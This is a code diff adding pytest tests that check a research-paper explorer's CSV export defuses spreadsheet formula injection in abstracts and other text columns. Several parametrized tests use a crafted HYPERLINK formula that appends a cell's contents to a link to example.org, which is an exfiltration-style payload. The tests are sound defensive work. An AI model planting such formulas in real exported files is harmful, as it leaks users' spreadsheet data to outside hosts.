@@ -54,3 +54,70 @@ def test_an_empty_selection_still_gives_a_header(methods: pd.DataFrame) -> None:
     frame = _read_back(csv_bytes(methods.iloc[0:0]))
     assert frame.empty
     assert list(frame.columns) == list(PUBLIC_COLUMNS)
+
+
+def test_download_carries_the_abstract_fields_when_they_are_attached() -> None:
+    from explorer.abstracts import load_collection
+    from explorer.constants import ABSTRACT_FIELDS, DATA_PATH
+
+    collection = load_collection(DATA_PATH)
+    frame = _read_back(csv_bytes(collection))
+    assert list(frame.columns) == [*PUBLIC_COLUMNS, *ABSTRACT_FIELDS]
+    openmax = frame.loc[frame["id"] == "4"].iloc[0]
+    assert openmax["abstract"].startswith("Deep networks have produced")
+    assert "\n" not in openmax["abstract"]
+
+
+def _with_abstract(text: str) -> pd.DataFrame:
+    from tests.conftest import make_frame, make_row
+
+    frame = make_frame(make_row(id="1"))
+    return frame.assign(
+        abstract=text,
+        abstract_source="arXiv",
+        abstract_url="https://arxiv.org/abs/1",
+        abstract_match="arxiv id",
+    )
+
+
+@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r"])
+def test_an_abstract_that_a_spreadsheet_would_run_as_a_formula_is_defused(
+    lead: str,
+) -> None:
+    """Abstracts are third-party text: an opening sign must not become a formula."""
+    risky = f'{lead}HYPERLINK("https://example.org/?"&A1,"click") and more text'
+    cell = _read_back(csv_bytes(_with_abstract(risky))).loc[0, "abstract"]
+    assert cell == "'" + risky  # shown with a leading quote, not run
+
+
+def test_an_ordinary_abstract_is_downloaded_unchanged() -> None:
+    text = "Deep networks, in 2016: a = b + c - d @ e."
+    assert _read_back(csv_bytes(_with_abstract(text))).loc[0, "abstract"] == text
+
+
+def test_defusing_does_not_change_the_table_it_was_given() -> None:
+    frame = _with_abstract("=1+1")
+    csv_bytes(frame)
+    assert frame.loc[0, "abstract"] == "=1+1"
+
+
+@pytest.mark.parametrize(
+    "column",
+    [
+        "id",
+        "method",
+        "title",
+        "authors_surnames",
+        "venue",
+        "tree_family",
+        "doi",
+        "arxiv",
+    ],
+)
+def test_every_text_column_of_the_download_is_defused_not_only_the_abstract(
+    column: str,
+) -> None:
+    from tests.conftest import make_frame, make_row
+
+    frame = make_frame(make_row(**{column: "=1+1"}))
+    assert _read_back(csv_bytes(frame)).loc[0, column] == "'=1+1"
